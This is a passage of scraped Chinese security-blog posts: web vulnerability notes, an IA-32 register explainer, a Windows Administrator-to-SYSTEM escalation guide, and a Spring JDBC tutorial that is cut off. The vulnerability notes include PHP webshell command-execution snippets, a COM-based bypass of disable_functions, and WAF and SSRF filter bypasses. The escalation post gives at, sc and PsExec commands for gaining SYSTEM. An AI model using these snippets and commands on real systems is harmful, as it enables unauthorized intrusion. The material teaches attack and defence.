2、命令执行小集： 12345678910111213141516&lt;?phpcmd=\"system\";ob_start(cmd);echo \"_GET[cunlide]\";ob_end_flush();echo \"&lt;br&gt;\";system(\"GET[cunlide]\");echo \"&lt;br&gt;\";echo exec(\"$GET[cunlide]\");echo \"&lt;br&gt;\";echo shell_exec(\"_GET[cunlide]\");echo \"&lt;br&gt;\";echo passthru(\"GET[cunlide]\");echo \"&lt;br&gt;\";echo `$GET[cunlide]`;?&gt; 3、PHP后门木马常用的函数类型： 执行系统命令：system, passthru, shell_exec, exec, popen, proc_open 代码执行与加密：eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13 文件包含与生成：require，require_once，include, include_once，file_get_contents, file_put_contents, fputs, fwrite.htaccess：SetHandler, auto_prepend_file, auto_append_file 二、绕过WAF的方法1、黑白名单测试绕过 2、可用符号替换 3、换行符\\n 4、$IFS替换空格 三、绕过disable_functions的方法禁止 webshell 执行命令原理：PHP配置文件里的disable_functions = 配置，用来禁止某些 php 函数。 1、 黑名单绕过 2、 系统组件绕过（Windows）： 12345678&lt;?phpcommand=_POST[a];wsh = new COM('WScript.shell'); // 生成一个 COM 对象exec = wsh-&gt;exec('cmd.exe /c '.command); //调用对象方法来执行命令stdout = exec-&gt;StdOut();stroutput = stdout-&gt;ReadAll();echo $stroutput?&gt; Shell.Application 也可以实现同样的效果。 彻底的解决方案是直接删除 System32 目录下 wshom.ocx 文件。 3、 扩展库绕过：Linux下可通过编译拓展库进行绕过。 防御方法：将dl函数加入disable_function中禁用。 使用PHP突破Disable_functions执行Linux命令：linux 的 webshell 管理员禁用了exec，system，passthru，popen，shell_exec等等 PHP 执行命令函数，导致不能执行命令，php 提供了一个扩展模块功能，使用 dl 函数能包含一个扩展模块。类似.so或者想windows下的 dll 文件。可以自定义函数来调用 linux 命令而无视Disable_functions的限制。 在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给 create_function()执行任意命令。 四、检测方法基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。 基于白盒的测试：查看源代码，搜索PHP中执行系统命令的函数如system、passthru等。 五、防御方法1、尽量不要执行外部的应用程序或命令。 2、使用自定义函数或函数库实现外部应用程序或命令的功能。 3、在执行 system 等命令执行功能的函数前，确定参数内容。 4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“ ;”会被转义为“\\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \\ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 暴力破解一、基本概念漏洞定义 暴力破解其实并不算是漏洞而是设计缺陷，当页面或程序未对请求的数量进行严格的限制时，攻击者可使用字典一直暴力破解用户名密码，导致密码被破解出来的安全风险。 分类 1、C/S架构暴力破解： 主要使用的破解工具Hydra、Bruter、X-scan 2、B/S架构暴力破解： 使用Burpsuite镜像表单爆破 二、检测方法简单粗暴的方法，直接使用Burpsuite进行暴力破解，看看有没有什么防暴破的机制即可。 三、防御方法1、设置复杂的密码 2、采用验证码机制，同时可防范CSRF攻击 3、登陆日志，限制登录次数 4、调用sleep()函数，当登录失败时停止一段时间才允许再次登录，如DVWA的High级的防暴破机制 代码注入一、基本概念漏洞定义 代码注入，与命令注入类似，程序未对用户输入内容进行严格校验从而导致恶意代码注入执行，只不过是注入到特定的编程语言代码中，如PHP的eval注入、HTML页面的JS注入、OGNL注入等。 这里以PHP为主，Java代码会在Java分类中单独总结。 成因 程序未严格区分用户输入的内容是数据还是代码。 PHP中代码注入函数 eval()、assert()、preg_replace()、str_replace()、call_user_func()…等函数。 eval()函数注入攻击，将参数字符串作为PHP 程序代码来执行，用户可以将 PHP 代码保存成字符串的形式，然后传递给 eval 函数执行。 PHP中的assert()、preg_replace()、str_replace()以及call_user_func()函数同样可以实现eval 注入攻击的效果。preg_replace()函数的作用是用来执行常规表达式的查找和替换的，当替换内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。 二、绕过WAF的方法和命令注入类似。 三、检测方法基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。 基于白盒的测试：查看源代码，搜索与执行PHP代码的函数如eval、assert等。 四、防御方法1、尽量不要执行外部的应用程序或命令。 2、使用自定义函数或函数库实现外部应用程序或命令的功能。 3、在执行php中eval()等代码执行功能的函数前，确定参数内容。 4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“ ;”会被转义为“\\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \\ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 SSRF一、基本概念漏洞定义 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源。 出现漏洞的常见位置 1）分享：通过URL地址分享网页内容 2）转码服务 3）在线翻译 4）图片加载与下载：通过URL地址加载或下载图片 5）图片、文章收藏功能 6）未公开的api实现以及其他调用URL的功能 7）从URL关键字中寻找 二、绕过WAF的方法主要针对URL过滤的绕过。 1、 使用@符号：我们请求http://a.com@b.com与请求http://b.com的结果是一致的； 2、 IP地址转换进制访问：如115.239.210.26 ＝ 16373751032 3、 添加端口号：http://127.0.0.1:8080 4、 使用短链接：http://dwz.cn/11SMa 三、检测方法1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞 2、在页面源码中查找访问的资源地址 ，如果该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 四、防御方法1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 3、限制请求的端口为http常用的端口，比如，80,443,8080,8090。 4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。 5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。 XML注入一、基本概念漏洞定义 XML是一种可扩展标记语言，可以理解为HTML的扩展语言，一般用于数据存储、数据传输、数据共享，其中DTD文档来解释XML文档。XML必须包含根元素，所有的标签都要闭合，对大小写敏感，并且属性值需要加引号。 XML注入即XXE（XML外部实体注入），是指利用可控的参数或入口来加载不可控的参数或代码，造成不可控的运行结果。 ENTITY实体：如果在XML文档中需要频繁使用某一条数据，可以预先给这个数据起一个别名。即一个ENTITY，然后再在文档中调用它。 XML定义了两种类型的ENTITY，一种在XML文档中使用，另一种在为参数在DTD文件中使用。 定义语法：\\&lt;!DOCTYPE 文件名 [ \\&lt;!ENTITY 实体名 “实体内容”&gt; ] &gt; 定义好的ENTITY在文档中通过“&amp;实体名;”来使用。 正常来说，DTD分为内部DTD与外部DTD，内部DTD包含在XML文档中,外部DTD则通过URL引用。一个DTD文件是以.dtd结尾的文本文件 。前面还要加上SYSTEM，但是如果此处没有任何过滤，我们完全可以引用系统敏感文件的，前提是页面有回显，否则你只引用了文件但不知道文件内容。 成因： Xfire使用了STAX解析XML导致XML实体注入发生。 1、直接引入XML外部实体 2、未加任何过滤直接parse 漏洞危害： 1、任意文件读取：通过外部实体引用，可以获取文件内容 2、URL请求，SSRF 3、DoS 4、远程代码执行：在PHP开启expect扩展的前提下 二、检测方法盲测：判断request的XML请求是否被解析，可以根据请求头中的“SOAP”字段来判断，也可以根据错误返回中有“SAX”字样。 漏洞挖掘总结：一般为Xfire开发的或者某些wsdl结尾的文件。 1、Service为Xfire 2、明显的XML作为内容的输入点 3、某些以JSON格式的Request 三、防御方法1、禁用外部实体 2、过滤和验证用户提交的XML数据 3、不允许XML中含有任何自己声明的DTD 4、有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可 反序列化漏洞一、基本概念漏洞定义 通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 这里以PHP为例，Java的会在Java分类单独总结。 PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 PHP魔法函数 下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。 __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。 __sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。 _wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个\\_wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 PHP反序列化漏洞分类 unserialize()反序列化漏洞 session反序列化漏洞 phar反序列化漏洞 二、检测方法以PHP为例，全局搜索PHP的反序列化函数如unserialize()，查看其中涉及的文件代码中是否含有魔法函数或其他危险的类方法，且进一步排查魔法函数的内容是否外界可控且存在危险操作。 三、防御方法1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。 XPath注入一、基本概念漏洞定义 待完善… 二、检测方法待完善… 三、防御方法待完善… LDAP注入具体可参考技术详解：基于Web的LDAP注入漏洞 CRLF注入待完善… URL不安全重定向待完善… 点击劫持待完善… HTML5安全待完善… Web缓存攻击待完善…","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"}]},{"title":"IA-32（Intel Architecture 32位）寄存器","date":"2019-01-28T15:51:20.000Z","path":"2019/01/28/IA-32寄存器/","text":"通用寄存器用于传送和暂存数据，参与算数逻辑运算并保存运算结果。IA-32每个通用寄存器的大小都是32位，即4个字节，主要用来保存常量和地址等信息。 以下4个通用寄存器主要用于算术运算如ADD、SUB、XOR、OR等，常用于保存常量与变量的值。 EAX：（针对操作数和结果数据的）累加器，一般用在函数返回值中，所有Win32 API函数都会把返回值保存到EAX后再返回。EAX寄存器又分为高、低几个独立的寄存器，AX（0-15）为EAX（0-31）的低16位独立寄存器，而AX又分为高8位的AH（8-15）和低8位的AL（0-7）两个独立寄存器，下面的EBX、ECX和EDX同理。 EBX：（DS段中的数据指针）基址寄存器。 ECX：（字符串和循环操作的）计数器，如在循环命令LOOP中用来循环计数、每执行完一次循环ECX就自减一。 EDX：（I/O指针）数据寄存器。 以下4个通用寄存器主要用于保存内存地址的指针。 ESI：（字符串操作源指针）源变址寄存器。 EDI：（字符串操作目标指针）目的变址寄存器，ESI和EDI与特定指令（LODS、STOS、REP、MOVS等）一起使用，主要用于内存复制。 EBP：（SS段中栈内数据指针）扩展基址指针寄存器，表示栈区域的基地址，即指向栈最上面的一个栈帧的底部，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃（即栈帧技术）。 ESP：（SS段中栈指针）栈指针寄存器，指向栈区域的栈顶地址。 段寄存器在IA-32的保护模式中，段是一种内存保护技术，将内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等以保护内存。段内存记录在SDT中，而段寄存器持有这些SDT的索引。每个段寄存器的大小为16位，即2个字节，且每个段寄存器指向的段描述符与虚拟内存结合，形成一个线性地址，借助分页技术，线性地址最终被转换为实际的物理地址。 CS：Code Segment，代码段寄存器。 DS：Data Segment，数据段寄存器。 SS：Stack Segment，栈段寄存器。 ES：Extra (Data) Segment，附加（数据）段寄存器。 FS：Data Segment，数据段寄存器，在程序调试中经常用于计算SEH（结构化异常处理机制）、TEB（线程环境块）、PEB（进程环境块）。 GS：Data Segment，数据段寄存器。 其中ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。 程序状态与控制寄存器EFLAGS：Flag Register，标志寄存器，大小为4个字节即32位，每一位都有意义，有些位由系统直接设定，有些位则根据程序命令的执行结果设置。 先了解3个常用的与程序调试相关的标志，ZF（Zero Flag零标志）、OF（Overflow Flag溢出标志）、CF（Carry Flag进位标志）。 ZF：若运算结果为0，则为1（True），否则为0（False）。 OF：有符号整数溢出时，则为1。此外，MSB（最高有效位）改变时，也为1。 CF：无符号整数溢出时，则为1。 指令指针寄存器EIP：Instruction Pointer，指令指针寄存器，保存着CPU要执行的指令地址，大小为32位即4个字节。 程序运行时，CPU会读取EIP中的一条指令地址，传送指令到指令缓冲区后，EIP寄存器的值将自动增加，增加的大小为读取指令的字节大小。CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。 注意的就是，EIP寄存器和通用寄存器不同，不能直接修改EIP的值，只能通过其他指令间接修改，如JMP、Jcc、CALL、RET。也可以通过中断或者异常来修改EIP的值。","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"}]},{"title":"Administrator提权到System","date":"2019-01-01T15:12:41.000Z","path":"2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System/","text":"在Windows中，用户一般分为3大类，即普通用户User、管理员Administrator和系统用户System。System和Administrator的权限并不是包含的，两者之间各有不同的地方，因而有时候即使有管理员Administrator的权限还是无法利用需要System用户才能使用的进程等，所以就需要提权了。 为了方便在Windows命令行中查看当前用户，可以使用whoami命令，但是需要先将whoami.exe程序放置在C盘中的system32目录中。对于该程序可以在Kali Linux中获得，具体路径为： 1/usr/share/windows-binaries/ 0x01 通过at命令实现提权这种方法在Windows XP、2003等系统可行，win7之后该命令被删除。 查看at命令的参数： 1at /? 找到有/interactive参数，即以交互的方式执行命令，可以看到该命令的执行结果，否则命令在后台执行而看不到。 在指定时间运行at命令中参数cmd命令（xx:xx表示几时几分，如10:12）： 1at xx:xx /interactive cmd 此时从任务管理器可看出cmd命令的用户名是System，接着在该启动的cmd窗口中启动的程序都是以System用户名启动的。但是除了System启动的进程之外，界面还是Administrator用户，为了更方便一些，可以用以下方法实现将界面的操作都转化为用户System的：在System的命令行输入taskmgr命令来用System用户打开任务管理器，将其中Administrator用户的explorer进程终止掉，此时可发现界面背景等都没了，再在任务管理器中的&lt;文件&gt;选项中新建explorer进程，此时的界面就是System用户的界面了。 0x02 通过sc命令来创建服务（服务都通过System账号操作）在命令行输入： 1sc Create syscmd binPath= ”cmd /k start” type= own type= interact 这样就创建了名为syscmd、类型为交互的、功能为打开新的cmd窗口的服务。需要注意的一点是，在后面的三个参数中等号的后面必须加一个空格，否则无法正常创建服务。可在Run中输入services.msc来查看该服务。 接着需要在命令行输入以下命令启动服务： 1sc start syscmd 也可以通过界面来启动该服务即可。 图示中已创建了该服务因而显示创建失败。 0x03 通过SysInternal Suite工具实现提权从网站下载相应的套件即Suite。将其中的PsExec工具放入system32目录中，在命令行中输入PsExec命令来确定参数i交互和s用System用户，输入该命令即可： 1PsExec -i -s cmd 0x04 几个命令另外一些小知识，关于命令行中用户名的几个命令： 修改相应的用户的密码： 1net user &lt;用户名&gt; * 查看所有的用户： 1net user 查看当前账号的基本情况： 1net user &lt;用户名&gt;","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"},{"name":"提权","slug":"提权","permalink":"https://www.mi1k7ea.com/tags/提权/"}]},{"title":"Spring基础篇之JDBC框架","date":"2019-01-01T14:58:07.000Z","path":"2019/01/01/Spring基础篇之JDBC框架/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 JDBC框架概述在使用普通的JDBC数据库时，就会很麻烦的写不必要的代码来处理异常，打开和关闭数据库连接等。但Spring JDBC框架负责所有的低层细节，从开始打开连接，准备和执行SQL语句，处理异常，处理事务，到最后关闭连接。 所以当从数据库中获取数据时，你所做的是定义连接参数，指定要执行的SQL语句，每次迭代完成所需的工作。 Spring JDBC提供几种方法和数据库中相应的不同的类与接口。我将给出使用JdbcTemplate类框架的经典和最受欢迎的方法。这是管理所有数据库通信和异常处理的中央框架类。 0x02 JdbcTemplate类Spring框架提供的JDBC支持主要由四个包组成，分别是core（核心包）、object（对象包）、dataSource（数据源包）和support（支持包），org.springframework.jdbc.core.JdbcTemplate类就包含在核心包中。作为Spring JDBC的核心，JdbcTemplate类中包含了所有数据库操作的基本方法。 JdbcTemplate类执行SQL查询、更新语句和存储过程调用，执行迭代结果集和提取返回参数值。它也捕获JDBC异常并转换它们到org.springframework.dao包中定义的通用类、更多的信息、异常层次结构。 JdbcTemplate类继承自抽象类JdbcAccessor，同时实现了JdbcOperations接口。其直接父类JdbcAccessor为子类提供了一些访问数据库时使用的公共属性： DataSource：其主要功能是获取数据库连接，具体实现时还可以引入对数据库连接的缓冲池和分布式事务的支持，它可以作为访问数据库资源的标准接口； SQLExceptionTranslator：org.springframework.jdbc.support.SQLExceptionTranslator接口负责对SQLException进行转译工作。通过必要的设置或者获取SQLExceptionTranslator中的方法，可以使 JdbcTemplate在需要处理SQLException时，委托SQLExceptionTranslator的实现类完成相关的转译工作； 使用JdbcTemplate类时常见的做法是在你的Spring配置文件中配置数据源，然后共享数据源bean依赖注入到DAO类中，并在数据源的设值函数中创建了JdbcTemplate。 0x03 JDBC配置配置模板如下： 12345678910111213141516171819202122232425262728&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http:/www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;!-- 配置数据源 --&gt; &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.dataSource.DriverManagerDataSource\"&gt; &lt;!--数据库驱动--&gt; &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\" /&gt; &lt;!--连接数据库的url--&gt; &lt;property name= \"url\" value=\"jdbc:mysql://localhost/spring\" /&gt; &lt;!--连接数据库的用户名--&gt; &lt;property name=\"username\" value=\"root\" /&gt; &lt;!--连接数据库的密码--&gt; &lt;property name=\"password\" value=\"root\" /&gt; &lt;/bean&gt; &lt;!--配置JDBC模板--&gt; &lt;bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.jdbcTemplate\"&gt; &lt;!--默认必须使用数据源--&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; &lt;!--配置注入类--&gt; &lt;bean id=\"xxx\" class=\"xxx\"&gt; &lt;property name=\"jdbcTemplate\" ref=\"jdbcTemplate\"/&gt; &lt;/bean&gt; ...&lt;/beans&gt; 在上述代码中，定义了三个Bean，分别是dataSource、jdbcTemplate和需要注入类的Bean。其中dataSource对应的是DriverManagerDataSource类，用于对数据源进行配置；jdbcTemplate对应JdbcTemplate类，该类中定义了JdbcTemplate的相关配置。 在定义jdbcTemplate时，需要将dataSource注入jdbcTemplate中。而在其他的类中要使用jdbcTemplate，也需要将jdbcTemplate注入使用类中（通常注入dao类中）。 在dataSource中定义了四个连接数据库的属性： 属性名 含义 driverClassName 所使用的驱动名称，对应驱动 JAR 包中的 Driver 类 url 数据源所在地址 username 访问数据库的用户名 password 访问数据库的密码 0x04 JDBC框架使用数据访问对象（DAO）DAO（Data Access Object）数据访问对象是一个面向对象的数据库接口。DAO类都是进行数据操作的类，是对于数据库中的数据做增删改查等操作的代码。 在Spring中，数据访问对象（DAO）支持很容易用统一的方法使用数据访问技术，如JDBC、Hibernate、JPA或者JDO。 执行SQL语句我们看看如何使用SQL和jdbcTemplate对象在数据库表中执行CRUD（创建、读取、更新和删除）操作。 查询一个整数类型： 12String SQL = \"select count(*) from Student\";int rowCount = jdbcTemplateObject.queryForInt( SQL ); 查询一个 long 类型： 12String SQL = \"select count(*) from Student\";long rowCount = jdbcTemplateObject.queryForLong( SQL ); 一个使用绑定变量的简单查询： 12String SQL = \"select age from Student where id = ?\";int age = jdbcTemplateObject.queryForInt(SQL, new Object[]&#123;10&#125;); 查询字符串： 12String SQL = \"select name from Student where id = ?\";String name = jdbcTemplateObject.queryForObject(SQL, new Object[]&#123;10&#125;, String.class); 查询并返回一个对象： 123456789101112String SQL = \"select * from Student where id = ?\";Student student = jdbcTemplateObject.queryForObject(SQL, new Object[]&#123;10&#125;, new StudentMapper());public class StudentMapper implements RowMapper&lt;Student&gt; &#123; public Student mapRow(ResultSet rs, int rowNum) throws SQLException &#123; Student student = new Student(); student.setID(rs.getInt(\"id\")); student.setName(rs.getString(\"name\")); student.setAge(rs.getInt(\"age\")); return student; &#125;&#125; 查询并返回多个对象： 123456789101112String SQL = \"select * from Student\";List&lt;Student&gt; students = jdbcTemplateObject.query(SQL, new StudentMapper());public class StudentMapper implements RowMapper&lt;Student&gt; &#123; public Student mapRow(ResultSet rs, int rowNum) throws SQLException &#123; Student student = new Student(); student.setID(rs.getInt(\"id\")); student.setName(rs.getString(\"name\")); student.setAge(rs.getInt(\"age\")); return student; &#125;&#125; 在表中插入一行： 12String SQL = \"insert into Student (name, age) values (?, ?)\";jdbcTemplateObject.update( SQL, new Object[]&#123;\"Zara\", 11&#125; ); 更新表中的一行： 12String SQL = \"update Student set name = ? where id = ?\";jdbcTemplateObject.update( SQL, new Object[]&#123;\"Zara\", 10&#125; ); 从表中删除一行： 12String SQL = \"delete Student where id = ?\";jdbcTemplateObject.update( SQL, new Object[]&#123;20&#125; ); 执行DDL语句DDL是数据定义语言的缩写，简单来说，就是对数据库内部的对象进行创建、删除、修改的操作语言。它和DML语言的最大区别是DML只是对表内部数据的操作，而不涉及到表的定义、结构的修改，更不会涉及到其他对象。DDL语句更多的是被数据库管理员（DBA）所使用，一般的开发人员很少使用。 你可以使用jdbcTemplate中的execute(..)方法来执行任何SQL语句或DDL语句。下面是一个使用CREATE语句创建一个表的示例： 123456String SQL = \"CREATE TABLE Student( \" + \"ID INT NOT NULL AUTO_INCREMENT, \" + \"NAME VARCHAR(20) NOT NULL, \" + \"AGE INT NOT NULL, \" + \"PRIMARY KEY (ID));\"jdbcTemplateObject.execute( SQL ); DemoStudentDAO.java，数据访问对象接口： 123456789101112131415161718192021222324252627282930313233343536373839package com.mi1k7ea;import javax.sql.DataSource;import java.util.List;public interface StudentDAO &#123; /** * This is the method to be used to initialize * database resources ie. connection. */ public void setDataSource(DataSource ds); /** * This is the method to be used to create * a record in the Student table. */ public void create(String name, Integer age); /** * This is the method to be used to list down * a record from the Student table corresponding * to a passed student id. */ public Student getStudent(Integer id); /** * This is the method to be used to list down * all the records from the Student table. */ public List&lt;Student&gt; listStudents(); /** * This is the method to be used to delete * a record from the Student table corresponding * to a passed student id. */ public void delete(Integer id); /** * This is the method to be used to update * a record into the Student table. */ public void update(Integer id, Integer age);&#125; Student.java： 12345678910111213141516171819202122232425package com.mi1k7ea;public class Student &#123; private Integer age; private String name; private Integer id; public void setAge(Integer age) &#123; this.age = age; &#125; public Integer getAge() &#123; return age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public Integer getId() &#123; return id; &#125;&#125; StudentMapper.java： 12345678910111213141516package com.mi1k7ea;import org.springframework.jdbc.core.RowMapper;import java.sql.ResultSet;import java.sql.SQLException;public class StudentMapper implements RowMapper&lt;Student&gt; &#123; public Student mapRow(ResultSet rs, int rowNum) throws SQLException &#123; Student student = new Student(); student.setId(rs.getInt(\"id\")); student.setName(rs.getString(\"name\")); student.setAge(rs.getInt(\"age\")); return student; &#125;&#125; StudentJDBCTemplate.java，定义的DAO接口StudentDAO的实现类： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.mi1k7ea;import org.springframework.jdbc.core.JdbcTemplate;import javax.sql.DataSource;import java.util.List;public class StudentJDBCTemplate implements StudentDAO &#123; private DataSource dataSource; private JdbcTemplate jdbcTemplateObject; public void setDataSource(DataSource dataSource) &#123; this.dataSource = dataSource; this.jdbcTemplateObject = new JdbcTemplate(dataSource); &#125; public void create(String name, Integer age) &#123; String SQL = \"insert into Student (name, age) values (?, ?)\"; jdbcTemplateObject.update( SQL, name, age); System.out.println(\"Created Record Name = \" + name + \" Age = \" + age); return; &#125; public Student getStudent(Integer id) &#123; String SQL = \"select * from Student where id = ?\"; Student student = jdbcTemplateObject.queryForObject(SQL, new Object[]&#123;id&#125;, new StudentMapper()); return student; &#125; public List&lt;Student&gt; listStudents() &#123; String SQL = \"select * from Student\"; List &lt;Student&gt; students = jdbcTemplateObject.query(SQL, new StudentMapper()); return students; &#125; public void delete(Integer id)&#123; String SQL = \"delete from Student where id = ?\"; jdbcTemplateObject.update(SQL, id); System.out.println(\"Deleted Record with ID = \" + id ); return; &#125; public void update(Integer id, Integer age)&#123; String SQL = \"update Student set age = ? where id = ?\"; jdbcTemplateObject.update(SQL, age, id); System.out.println(\"Updated Record with ID = \" + id ); return; &#125;&#125; MainApp.java： 12345678910111213141516171819202122232425262728293031package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.util.List;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); StudentJDBCTemplate studentJDBCTemplate = (StudentJDBCTemplate)context.getBean(\"studentJDBCTemplate\"); System.out.println(\"------Records Creation--------\" ); studentJDBCTemplate.create(\"Zara\", 11); studentJDBCTemplate.create(\"Nuha\", 2); studentJDBCTemplate.create(\"Ayan\", 15); System.out.println(\"------Listing Multiple Records--------\" ); List&lt;Student&gt; students = studentJDBCTemplate.listStudents(); for (Student record : students) &#123; System.out.print(\"ID : \" + record.getId() ); System.out.print(\", Name : \" + record.getName() ); System.out.println(\", Age : \" + record.getAge()); &#125; System.out.println(\"----Updating Record with ID = 2 -----\" ); studentJDBCTemplate.update(2, 20); System.out.println(\"----Listing Record with ID = 2 -----\" ); Student student = studentJDBCTemplate.getStudent(2); System.out.print(\"ID : \" + student.getId() ); System.out.print(\", Name : \" + student.getName() ); System.out.println(\", Age : \" + student.getAge()); &#125;&#125; Beans.xml： 1234567891011121314151617181920&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \"&gt; &lt;!-- Initialization for data source --&gt; &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"&gt; &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"/&gt; &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/test?serverTimezone=UTC\"/&gt; &lt;property name=\"username\" value=\"root\"/&gt; &lt;property name=\"password\" value=\"\"/&gt; &lt;/bean&gt; &lt;!-- Definition for studentJDBCTemplate bean --&gt; &lt;bean id=\"studentJDBCTemplate\" class=\"com.mi1k7ea.StudentJDBCTemplate\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; 